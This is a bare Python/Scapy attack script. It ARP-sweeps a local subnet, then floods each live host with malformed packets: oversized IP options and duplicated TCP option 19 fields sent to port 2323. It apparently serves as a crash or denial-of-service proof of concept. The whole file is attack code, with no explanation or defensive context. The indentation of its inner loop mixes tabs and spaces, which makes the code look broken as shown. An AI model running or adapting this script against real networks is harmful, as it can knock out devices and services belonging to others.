from scapy.all import *
if __name__=="__main__":
    for ipFix in range(1,255):
        ip="192.168.234."+str(ipFix)
        arpPkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip, hwdst="ff:ff:ff:ff:ff:ff")
        res = srp1(arpPkt, timeout=1, verbose=False)
        if res:
	    	for i in range(8,20):
            	send(IP(dst=ip,options=[IPOption("A"*i)])/TCP(dport=2323,options=[(19, "1"*18),(19, "2"*18)]))
        	print ("Check Over %s" % ip)